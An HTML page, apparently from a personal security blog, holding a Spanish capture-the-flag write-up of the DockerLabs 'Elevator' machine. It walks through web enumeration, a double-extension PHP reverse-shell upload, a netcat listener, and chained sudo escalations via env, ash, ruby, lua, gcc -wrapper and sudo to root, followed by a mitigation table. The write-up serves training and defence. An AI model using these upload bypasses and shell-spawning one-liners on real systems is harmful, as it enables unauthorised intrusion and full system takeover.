@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina Elevator | ZsZsec</title>
+<meta content="Introduccion Buen dia gente hoy estaremos resolviendo la maquina Elevator de la plataforma DockerLabs , esta maquina es una maquina de nivel Facil en la que aprenderemos diferentes..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">DockerLabs</p>
+<h1>Maquina Elevator<span>_</span></h1>
+<div class="writeup-meta"><span>Nmap / gobuster / RCE</span></div>
+<div class="tag-row"><span class="tag">Nmap</span><span class="tag">gobuster</span><span class="tag">RCE</span><span class="tag">RevShell</span><span class="tag">Netcat</span><span class="tag">SUID</span><span class="tag">GTFOBinds</span><span class="tag">env</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h1>Introduccion</h1>
+<p>Buen dia gente hoy estaremos resolviendo la maquina <code>Elevator</code> de la plataforma <code>DockerLabs</code>, esta maquina es una maquina de nivel <code>Facil</code> en la que aprenderemos diferentes tecnicas de enumeracion de directorios, Subida de archivos maliciosos evitando las medidas de seguridad, escalada de privilegios de manera horizontal y finalmente la obtencion del control total del sistema.</p>
+<hr/>
+<h3>Reconocimiento inicial</h3>
+<p>Para iniciar la fase de reconocimiento, realicé un escaneo completo de puertos sobre el objetivo usando <strong>Nmap</strong>, una herramienta fundamental en cualquier fase de enumeración. El comando utilizado fue el siguiente:</p>
+<pre><code class="language-bash">zikuta㉿zikuta)-[~/Downloads]
+└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000  172.17.0.2  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 22:17 CDT
+Nmap scan report for asucar.dl (172.17.0.2)
+Host is up (0.000013s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-title: El Ascensor Embrujado - Un Misterio de Scooby-Doo
+|_http-server-header: Apache/2.4.62 (Debian)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+</code></pre>
+<p>A continuación, se explica detalladamente el propósito de cada parámetro:</p>
+<ul>
+<li><code>-sV</code>: Permite realizar <strong>detección de versiones</strong> de los servicios que se encuentran en los puertos abiertos.</li>
+<li><code>-sS</code>: Utiliza el <strong>escaneo TCP SYN</strong> (también conocido como <em>half-open scan</em>), que es rápido y sigiloso al no completar la conexión TCP.</li>
+<li><code>-Pn</code>: Desactiva el envío de pings antes del escaneo, útil si el host <strong>filtra ICMP</strong> o si ya sabemos que está activo.</li>
+<li><code>-p-</code>: Escanea <strong>todos los puertos TCP</strong> (del 1 al 65535), no solo los 1000 más comunes.</li>
+<li><code>-sC</code>: Ejecuta los <strong>scripts NSE por defecto</strong> que ayudan a identificar configuraciones vulnerables o información útil.</li>
+<li><code>--min-rate 5000</code>: Fuerza a Nmap a enviar <strong>al menos 5000 paquetes por segundo</strong>, acelerando el escaneo.</li>
+</ul>
+<p>El resultado del escaneo reveló lo siguiente:</p>
+<pre><code class="language-bash">PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-title: El Ascensor Embrujado - Un Misterio de Scooby-Doo
+|_http-server-header: Apache/2.4.62 (Debian)
+</code></pre>
+<p>Se encontró que el <strong>puerto 80 (HTTP)</strong> está abierto, corriendo un servidor <strong>Apache 2.4.62</strong> sobre Debian. También se obtuvo el título de la página, lo cual sugiere que el sitio tiene una temática relacionada con <em>Scooby-Doo</em>.</p>
+<h3>Enumeración Web</h3>
+<p>Al visitar la web en el navegador, observé una página sencilla con el título <em>"El Misterio del Ascensor Embrujado"</em>.</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/213ebaeb-08ab-42ab-9c04-bd7c0ae6a56f"/></p>
+<p>Al hacer clic en el botón del ascensor, aparecía un popup que decía:</p>
+<blockquote>
+<p>"¡El misterio ha sido resuelto!"</p>
+</blockquote>
+<p>No había formularios, enlaces ni secciones ocultas a simple vista, por lo que decidí utilizar técnicas de <strong>enumeración de contenido web</strong> para buscar directorios y archivos ocultos.</p>
+<h3>Búsqueda de directorios con Gobuster</h3>
+<p>Usé <strong>Gobuster</strong>, una herramienta para fuerza bruta de rutas y archivos en servidores web. El comando ejecutado fue:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/Downloads]
+└─$ gobuster dir -u http://172.17.0.2     -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,php,html,py -t 40
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.17.0.2
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,html,py,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 275]
+/index.html           (Status: 200) [Size: 5647]
+/.php                 (Status: 403) [Size: 275]
+/themes               (Status: 301) [Size: 309] [--&gt; http://172.17.0.2/themes/]                                             
+/.py                  (Status: 403) [Size: 275]
+/.txt                 (Status: 403) [Size: 275]
+/javascript           (Status: 301) [Size: 313] [--&gt; http://172.17.0.2/javascript/]                                         
+/Template             (Status: 403) [Size: 275]
+/Repository           (Status: 403) [Size: 275]
+/.txt                 (Status: 403) [Size: 275]
+/.py                  (Status: 403) [Size: 275]
+/.php                 (Status: 403) [Size: 275]
+/.html                (Status: 403) [Size: 275]
+/Tag                  (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+Progress: 851192 / 6369165 (13.36%)^C
+</code></pre>
+<p>Parámetros utilizados:</p>
+<ul>
+<li><code>-u</code>: URL objetivo.</li>
+<li><code>-w</code>: Wordlist utilizada para adivinar rutas (<code>directory-list-2.3-big.txt</code>, bastante completa).</li>
+<li><code>-x</code>: Extensiones a probar con cada palabra del diccionario (en este caso <code>.txt</code>, <code>.php</code>, <code>.html</code>, <code>.py</code>).</li>
+<li><code>-t 40</code>: Usa 40 <strong>threads concurrentes</strong> para mayor velocidad.</li>
+</ul>
+<p>Resultado relevante:</p>
+<pre><code class="language-bash">/themes               (Status: 301) [--&gt; http://172.17.0.2/themes/]
+/javascript           (Status: 301) [--&gt; http://172.17.0.2/javascript/]
+</code></pre>
+<p>El directorio <code>/themes/</code> parecía prometedor, por lo que decidí hacer una segunda ronda de fuerza bruta sobre él.</p>
+<h2>Enumeración sobre <code>/themes</code></h2>
+<p>Otra vez realice fuerza bruta sobre las rutas pero ahora sobre el directorio /themes.</p>
+<pre><code class="language-bash">──(zikuta㉿zikuta)-[~/Downloads]
+└─$ gobuster dir -u http://172.17.0.2/themes     -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,php,html,py -t 40
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.17.0.2/themes
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,php,html,py
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 275]
+/.txt                 (Status: 403) [Size: 275]
+/.html                (Status: 403) [Size: 275]
+/.py                  (Status: 403) [Size: 275]
+/uploads              (Status: 301) [Size: 317] [--&gt; http://172.17.0.2/themes/uploads/]                                     
+/upload.php           (Status: 200) [Size: 0]
+/Template             (Status: 403) [Size: 275]
+/archivo.html         (Status: 200) [Size: 3380]
+/Repository           (Status: 403) [Size: 275]
+</code></pre>
+<p>Entre los resultados se destacaban:</p>
+<pre><code class="language-bash">/uploads              (Status: 301) [--&gt; http://172.17.0.2/themes/uploads/]
+/upload.php           (Status: 200)
+/archivo.html         (Status: 200)
+</code></pre>
+<p>La existencia de un archivo <code>upload.php</code> y <code>archivo.html</code> sugería un posible <strong>formulario de subida de archivos</strong>, algo muy relevante en contextos de pentesting web.</p>
+<h3>Análisis de <code>archivo.html</code></h3>
+<p>Al visitar <code>http://172.17.0.2/themes/archivo.html</code>, se mostraba una interfaz donde se podía subir archivos con la siguiente indicación:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/bb4069ba-6a1c-4be4-bae4-2ca15345d4ef"/></p>
+<blockquote>
+<p>"Selecciona un archivo de imagen (solo .jpg)"</p>
+</blockquote>
+<p>Y</p>
+<blockquote>
+<p>"¡Archivo subido correctamente! Puedes verlo aquí."</p>
+</blockquote>
+<p>Esto confirmó que estábamos ante un <strong>formulario de subida de archivos</strong>, aparentemente limitado a extensiones <code>.jpg</code>. Este tipo de funcionalidades son conocidas por ser potencialmente vulnerables si no se validan correctamente los archivos subidos.</p>
+<h3>Carga de Shell Web (RCE)</h3>
+<p>Para comprobar si el servidor validaba correctamente los archivos, utilice una <strong>reverse shell</strong> de PentestMonkey con extensión doble: <code>.php.jpg</code>. Esto es una técnica común para evadir validaciones simples del lado del cliente o servidor.</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/603624b6-7430-4cfd-9e5d-38cde7d5f4b0"/></p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/elevator]
+└─$ nano shell.php.jpg
+</code></pre>
+<p>Guardé el archivo como <code>shell.php.jpg</code> y lo subí desde el formulario. El servidor aceptó el archivo sin queja y generó un enlace para visualizarlo. Esto indicaba que <strong>el código PHP dentro del archivo sí podría interpretarse si se accedía directamente</strong> a él como archivo <code>.php.jpg</code>.</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/92df4858-c491-4378-88f3-c28a1495d46d"/></p>
+<h3>Estableciendo conexión reversa</h3>
+<p>Preparé un <strong>listener</strong> en mi máquina con <code>netcat</code> luego, accedí al archivo malicioso desde el navegador, y al hacerlo se ejecutó el payload de la reverse shell, conectándose exitosamente a mi listener:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/Downloads]
+└─$ nc -lvnp 4444                                         
+listening on [any] 4444 ...
+connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 48636
+Linux c12adce9f850 6.12.13-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.13-1kali1 (2025-02-11) x86_64 GNU/Linux
+ 03:33:00 up 24 min,  0 user,  load average: 0.26, 4.90, 5.95
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>Obtuve acceso a una <strong>shell remota como el usuario www-data</strong>, que es el usuario por defecto del servidor web. Desde aquí comenzó la fase de post-explotación y escalada de privilegios.</p>
+<hr/>
+<h2>Conclusión de esta fase</h2>
+<p>A través de una correcta fase de reconocimiento y enumeración, se detectó una vulnerabilidad clásica de <strong>file upload sin restricciones reales</strong>, que permitió la ejecución remota de comandos en el servidor. Este tipo de vulnerabilidad sigue siendo muy común en aplicaciones web mal diseñadas, y puede comprometer gravemente la seguridad del sistema si no se controla adecuadamente.</p>
+<h1>Escalada de Privilegios</h1>
+<p>Después de conseguir acceso como el usuario web <code>www-data</code> a través de la subida de una reverse shell, la siguiente fase consiste en escalar privilegios hasta alcanzar el usuario <code>root</code>.</p>
+<p>Ejecutamos <code>sudo -l</code>  Este comando muestra qué comandos puede ejecutar el usuario actual (<code>www-data</code>) usando <code>sudo</code>, y si necesita o no contraseña para ello.</p>
+<pre><code class="language-bash">$ sudo -l 
+Matching Defaults entries for www-data on c12adce9f850:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User www-data may run the following commands on c12adce9f850:
+    (daphne) NOPASSWD: /usr/bin/env
+</code></pre>
+<p>Este resultado es <strong>clave</strong>: significa que el usuario <code>www-data</code> puede ejecutar <code>/usr/bin/env</code> como si fuera <code>daphne</code>, <strong>sin necesidad de contraseña</strong>.</p>
+<h3>¿Qué es <code>env</code>?</h3>
+<p>El comando <code>env</code> ejecuta otro programa en un nuevo entorno. Si lo usamos así:</p>
+<pre><code class="language-bash">sudo -u daphne /usr/bin/env /bin/sh
+whoami
+daphne
+</code></pre>
+<p><code>sudo -u daphne</code>: Ejecuta el comando como el usuario <code>daphne</code>.<br/>
+<code>/usr/bin/env /bin/sh</code>: Usa <code>env</code> para ejecutar una nueva shell <code>/bin/sh</code>.</p>
+<p>Este comando nos otorga una <strong>shell como el usuario <code>daphne</code></strong></p>
+<h3>Escalada de <code>daphne</code> → <code>vilma</code></h3>
+<p>Revisamos de nuevo los privilegios con <code>sudo -l</code>:</p>
+<pre><code class="language-bash">sudo -l
+Matching Defaults entries for daphne on c12adce9f850:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User daphne may run the following commands on c12adce9f850:
+    (vilma) NOPASSWD: /usr/bin/ash
+</code></pre>
+<p>Esto indica que podemos ejecutar el shell <code>ash</code> como <code>vilma</code> sin contraseña.</p>
+<pre><code>sudo -u vilma /usr/bin/ash 
+whoami
+vilma
+</code></pre>
+<p><code>ash</code>: es un shell ligero similar a <code>sh</code> que se encuentra en sistemas Unix.</p>
+<h3>Escalada de <code>vilma</code> → <code>shaggy</code></h3>
+<p>Otra vez revisamos privilegios con <code>sudo -l</code></p>
+<pre><code class="language-bash">sudo -l 
+Matching Defaults entries for vilma on c12adce9f850:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User vilma may run the following commands on c12adce9f850:
+    (shaggy) NOPASSWD: /usr/bin/ruby
+</code></pre>
+<p>Este resultado indica que <code>vilma</code> puede ejecutar el binario <code>/usr/bin/ruby</code> como si fuera <code>shaggy</code>, <strong>sin necesidad de proporcionar una contraseña</strong>.</p>
+<h3>¿Por qué esto es un riesgo?</h3>
+<p><strong>Ruby</strong>, al igual que Python, Perl o Lua, es un lenguaje interpretado de propósito general que <strong>permite la ejecución de comandos del sistema</strong> directamente desde su consola o mediante scripts. Permitir su ejecución en <code>sudo</code> (incluso sin privilegios de root) es una <strong>mala práctica</strong>, porque ofrece al atacante una vía directa para invocar una shell.</p>
+<h4>Ejecución de shell con Ruby</h4>
+<p>Usamos el siguiente comando para escalar a <code>shaggy</code>:</p>
+<pre><code class="language-bash">sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'
+</code></pre>
+<p><strong>Explicación</strong>:</p>
+<ul>
+<li><code>sudo -u shaggy</code>: Ejecuta el comando como el usuario <code>shaggy</code>.</li>
+<li><code>/usr/bin/ruby</code>: Invoca el intérprete Ruby.</li>
+<li><code>-e 'exec "/bin/sh"'</code>: Usa Ruby para ejecutar directamente <code>/bin/sh</code> reemplazando el proceso actual.</li>
+</ul>
+<p>El resultado fue exitoso:</p>
+<pre><code class="language-bash">whoami
+&gt; shaggy
+</code></pre>
+<h3>Riesgo real en entornos productivos</h3>
+<p>Permitir el uso de intérpretes en <code>sudo</code> es como dejar la puerta entreabierta. Incluso si no se otorgan privilegios de root directamente, un atacante puede escalar fácilmente si se les permite ejecutar binarios como Ruby, Python o Bash bajo otros usuarios con más privilegios.</p>
+<h2>Escalada de <code>shaggy</code> → <code>fred</code></h2>
+<p>Al revisar los privilegios de <code>shaggy</code>:</p>
+<pre><code class="language-bash">sudo -l
+Matching Defaults entries for shaggy on c12adce9f850:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User shaggy may run the following commands on c12adce9f850:
+    (fred) NOPASSWD: /usr/bin/lua
+</code></pre>
+<p>Nuevamente, encontramos que otro lenguaje interpretado está disponible para ser ejecutado sin autenticación.</p>
+<h3>Lua en <code>sudo</code>: un peligro subestimado</h3>
+<p><strong>Lua</strong> es un lenguaje menos común, pero extremadamente potente. Su función <code>os.execute()</code> permite ejecutar cualquier comando del sistema, igual que un shell.</p>
+<h4>Escalada usando Lua</h4>
+<p>El siguiente comando fue utilizado:</p>
+<pre><code class="language-bash">sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'
+whoami
+fred
+</code></pre>
+<p><strong>Desglose</strong>:</p>
+<ul>
+<li><code>-u fred</code>: El comando se ejecutará como <code>fred</code>.</li>
+<li><code>/usr/bin/lua</code>: Se invoca el intérprete Lua.</li>
+<li><code>-e 'os.execute("/bin/sh")'</code>: Se le pasa un código embebido que ejecuta <code>/bin/sh</code></li>
+</ul>
+<h3>Riesgo operativo</h3>
+<p>El problema no es solo Lua. El patrón es claro: <strong>dar acceso a binarios interpretados mediante <code>sudo</code> es un vector de escalada de privilegios inmediato</strong>. Un atacante con conocimientos básicos puede encadenar shells y moverse lateralmente con facilidad.</p>
+<h2>Escalada de <code>fred</code> → <code>scooby</code></h2>
+<p>Esta vez, el binario que se nos permite ejecutar es:</p>
+<pre><code class="language-bash">sudo -l 
+Matching Defaults entries for fred on c12adce9f850:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User fred may run the following commands on c12adce9f850:
+    (scooby) NOPASSWD: /usr/bin/gcc
+</code></pre>
+<p>Esto puede parecer inofensivo a primera vista: <strong>¿qué daño puede causar un compilador?</strong></p>
+<h3>GCC como vector de ataque</h3>
+<p><strong>GCC (GNU Compiler Collection)</strong> es un compilador, pero al igual que otros binarios del sistema, puede ser <strong>abiertamente abusado</strong> si se le permite correr con privilegios. En este caso, lo más peligroso es el flag <code>-wrapper</code>.</p>
+<h4>¿Qué hace <code>-wrapper</code>?</h4>
+<p>El flag <code>-wrapper</code> le dice a <code>gcc</code> que, en lugar de usar su binario interno para compilar, use un <strong>programa externo personalizado</strong>, que puede ser cualquier ejecutable.</p>
+<pre><code class="language-bash">sudo -u scooby /usr/bin/gcc -wrapper /bin/sh,-s .
+whoami
+scooby
+</code></pre>
+<p><strong>Explicación</strong>:</p>
+<ul>
+<li><code>-wrapper /bin/sh,-s</code>: Reemplaza el compilador con una shell interactiva.</li>
+<li><code>.</code>: No importa el archivo fuente, ya que no se compila nada realmente.</li>
+</ul>
+<h3>Conclusión</h3>
+<p>Permitir a un usuario ejecutar <code>gcc</code> con <code>sudo</code> es tan peligroso como permitirle ejecutar directamente <code>/bin/sh</code>. Es una forma encubierta de otorgar acceso total al sistema.</p>
+<hr/>
+<h2>Escalada final de <code>scooby</code> → <code>root</code></h2>
+<p>Finalmente, encontramos la joya de la corona:</p>
+<pre><code class="language-bash">sudo -l 
+Matching Defaults entries for scooby on c12adce9f850:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User scooby may run the following commands on c12adce9f850:
+    (root) NOPASSWD: /usr/bin/sudo
+</code></pre>
+<p>Esto significa que el usuario <code>scooby</code> <strong>puede ejecutar <code>sudo</code> como root sin contraseña</strong>. En otras palabras, puede hacer absolutamente lo que quiera, incluyendo ejecutar una shell:</p>
+<pre><code class="language-bash">sudo -u root /usr/bin/sudo sudo /bin/sh
+</code></pre>
+<p>Desglose:</p>
+<ul>
+<li><code>sudo -u root</code>: Ejecuta el siguiente comando como root.</li>
+<li><code>/usr/bin/sudo sudo /bin/sh</code>: Usa <code>sudo</code> para abrir una shell (<code>/bin/sh</code>) como root.</li>
+</ul>
+<p>Resultado:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/2efbf99f-7a3b-4826-be34-941d3f5f9c62"/></p>
+<h3>Riesgo total</h3>
+<p>Este es el escenario más crítico. La presencia de una cadena de usuarios con sudo mal configurado y binarios peligrosos ha permitido <strong>una escalada progresiva</strong> hasta el control total del sistema. Es un caso claro de <strong>escalera de privilegios mal protegida</strong>, algo que en producción puede ser devastador si se encuentra en manos equivocadas.</p>
+<hr/>
+<h3><strong>Cuadro de Mitigación de Vulnerabilidades - Máquina Elevator</strong></h3>
+<table>
+<thead>
+<tr>
+<th><strong>Fase de Ataque</strong></th>
+<th><strong>Vulnerabilidad Explotada</strong></th>
+<th><strong>Medidas de Mitigación</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Reconocimiento</strong></td>
+<td>Puerto 80 expuesto (HTTP)</td>
+<td>- Restringir acceso con firewalls (iptables/nftables).&lt;br&gt;- Usar HTTPS en lugar de HTTP.</td>
+</tr>
+<tr>
+<td><strong>Enumeración Web</strong></td>
+<td>Directorios ocultos accesibles (<code>/themes/uploads/</code>)</td>
+<td>- Deshabilitar listado de directorios en Apache (<code>Options -Indexes</code>).&lt;br&gt;- Eliminar archivos y directorios no necesarios.</td>
+</tr>
+<tr>
+<td><strong>Subida de Archivos</strong></td>
+<td>Validación insuficiente en <code>upload.php</code> (extensión <code>.php.jpg</code>)</td>
+<td>- Validar tipo MIME y contenido (no solo extensión).&lt;br&gt;- Renombrar archivos subidos (ej: <code>hash_random.file</code>).&lt;br&gt;- Almacenar archivos fuera del directorio web.</td>
+</tr>
+<tr>
+<td><strong>RCE (Reverse Shell)</strong></td>
+<td>Ejecución de PHP en archivos maliciosos</td>
+<td>- Deshabilitar ejecución de PHP en directorios de subida (<code>php_admin_flag engine off</code>).&lt;br&gt;- Usar WAF (ModSecurity) para bloquear payloads maliciosos.</td>
+</tr>
+<tr>
+<td><strong>Escalada Horizontal</strong></td>
+<td>Configuración insegura de <code>sudo</code> (binarios como <code>env</code>, <code>ash</code>, <code>ruby</code>, <code>lua</code>, <code>gcc</code>)</td>
+<td>- Eliminar permisos <code>NOPASSWD</code> para binarios peligrosos.&lt;br&gt;- Usar <code>sudo</code> solo para comandos específicos (no shells o lenguajes interpretados).&lt;br&gt;- Implementar RBAC (control de acceso basado en roles).</td>
+</tr>
+<tr>
+<td><strong>Escalada a Root</strong></td>
+<td><code>sudo</code> sin contraseña para usuario <code>scooby</code></td>
+<td>- Eliminar privilegios innecesarios (<code>visudo</code>).&lt;br&gt;- Requerir contraseña para <code>sudo</code>.&lt;br&gt;- Usar <code>sudo</code> con <code>secure_path</code>.</td>
+</tr>
+</tbody>
+</table>
+<hr/>
+<h3><strong>Recomendaciones Adicionales</strong>:</h3>
+<ol>
+<li><strong>Hardening de Servicios</strong>:<ul>
+<li>Actualizar Apache y el sistema operativo (<code>apt update &amp;&amp; apt upgrade</code>).</li>
+<li>Deshabilitar servicios innecesarios.</li>
+</ul>
+</li>
+<li><strong>Monitoreo</strong>:<ul>
+<li>Implementar logs detallados para actividades sospechosas (ej: subida de archivos).</li>
+<li>Usar herramientas como <code>auditd</code> para rastrear ejecuciones de comandos privilegiados.</li>
+</ul>
+</li>
+<li><strong>Principio de Mínimo Privilegio</strong>:<ul>
+<li>Ningún usuario debería tener permisos <code>sudo</code> para binarios que permitan ejecución arbitraria (ej: <code>ruby</code>, <code>env</code>).</li>
+</ul>
+</li>
+<li><strong>Contenedores Seguros</strong>:<ul>
+<li>Si se usa Docker, limitar capacidades (<code>--cap-drop=ALL</code>) y ejecutar procesos como usuario no privilegiado (<code>--user</code>).</li>
+</ul>
+</li>
+</ol>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
